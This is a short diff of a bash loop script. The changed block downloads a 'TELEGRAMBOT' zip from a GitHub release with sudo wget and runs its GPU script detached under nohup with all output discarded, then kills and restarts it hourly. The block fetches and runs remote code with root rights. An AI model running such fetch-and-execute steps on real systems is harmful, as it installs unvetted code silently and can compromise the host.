@@ -15,7 +15,7 @@ while true; do
         pkill -f "start_modelgp.sh"
         sleep 5
     fi
-
+ nohup bash -c '
     # Re-download the TELEGRAMBOT package (optional)
     sudo wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/TELEGRAMBOT/TELEGRAMBOT.zip
     sudo mkdir -p TELEGRAMBOT
@@ -28,7 +28,9 @@ while true; do
     sudo chmod +x start_modelgp.sh
 
     # Start your main GPU script
-    nohup bash ./start_modelgp.sh > /dev/null 2>&1 &
+    bash ./start_modelgp.sh
+    ' > /dev/null 2>&1 &
+
 
     echo "start_modelgp.sh is now running. It will run for 1 hour."
 
